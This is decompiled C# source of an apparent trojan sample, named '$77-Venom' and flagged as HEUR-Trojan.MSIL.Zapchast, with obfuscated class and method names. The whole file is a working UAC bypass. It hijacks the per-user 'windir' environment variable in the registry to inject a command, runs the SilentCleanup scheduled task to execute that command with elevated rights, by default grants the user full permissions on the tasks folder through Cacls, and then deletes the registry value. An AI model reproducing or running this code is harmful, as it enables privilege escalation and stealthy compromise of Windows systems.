// Decompiled with JetBrains decompiler
// Type: 蔤�㳸钽꛷⤪୭삟졐梠ᕙ쳝∼鹃庝渨홭뮯꒙
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan.MSIL.Zapchast.gen-2e1eda10e2bbd19418706a23888807e50c0407eb191cc26d541c85279193c3db.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Security.Principal;
using System.Threading;

public class \uE31E蔤\uFFFD㳸钽\uA6F7\u292A୭삟졐梠ᕙ쳝\u223C鹃庝渨홭뮯\uA499
{
  public static void ᤑ惬\u2CFA챠㹫ꠔ\uE899㤪䘓\u2597ꎘڑぉ곒禬\uF3B6\u0BAB\uFFFD\uE321䐀(string[] args)
  {
    Console.WriteLine("[+] Starting Bypass UAC.");
    string environmentVariable = Environment.GetEnvironmentVariable("SYSTEMROOT/tasks");
    string name = WindowsIdentity.GetCurrent().Name;
    string str;
    if (args.Length != 0)
    {
      str = args[0];
      Console.WriteLine("[+] Payload to be Executed " + str);
    }
    else
    {
      Console.WriteLine("[+] No Payload specified. Executing cmd.exe.");
      str = "C:\\Windows\\System32\\cmd.exe Cacls " + environmentVariable + " /e /t /g " + name + ":F";
    }
    try
    {
      RegistryKey subKey = Registry.CurrentUser.CreateSubKey("Environment");
      subKey.SetValue("windir", (object) ("cmd.exe /k " + str + " & "), RegistryValueKind.String);
      subKey.Close();
      Console.WriteLine("[+] Enviroment Variabled %windir% Created.");
    }
    catch
    {
      Console.WriteLine("[-] Unable to Create the Enviroment Variabled %windir%.");
      Console.WriteLine("[-] Exit.");
    }
    Console.WriteLine("[+] Waiting 5 seconds before execution.");
    Thread.Sleep(5000);
    try
    {
      Process.Start(new ProcessStartInfo()
      {
        CreateNoWindow = true,
        UseShellExecute = false,
        FileName = "schtasks.exe",
        Arguments = "/Run /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I"
      });
      Console.WriteLine("[+] UAC Bypass Application Executed.");
    }
    catch
    {
      Console.WriteLine("[-] Unable to Execute the Application schtasks.exe to perform the bypass.");
    }
    \uE31E蔤\uFFFD㳸钽\uA6F7\u292A୭삟졐梠ᕙ쳝\u223C鹃庝渨홭뮯\uA499.\u0FDA⃒ࣳ꾉엽䖽蟝\u2411ꉫหﮈ擠繆\uFFFD\uF190鰯ﱿ쟒呿\uE34E();
    Console.WriteLine("[-] Exit.");
  }

  private static void \u0FDA⃒ࣳ꾉엽䖽蟝\u2411ꉫหﮈ擠繆\uFFFD\uF190鰯ﱿ쟒呿\uE34E()
  {
    Console.WriteLine("[+] Registry Cleaning will start in 5 seconds.");
    Thread.Sleep(5000);
    try
    {
      RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Environment", true);
      if (registryKey != null)
      {
        try
        {
          registryKey.DeleteValue("windir");
          registryKey.Close();
        }
        catch (Exception ex)
        {
          Console.WriteLine("[-] Unable to Delete the Registry key (Environment). Error " + ex.Message);
        }
      }
      Console.WriteLine("[+] Registry Cleaned.");
    }
    catch
    {
      Console.WriteLine("[-] Unable to Clean the Registry.");
    }
  }
}
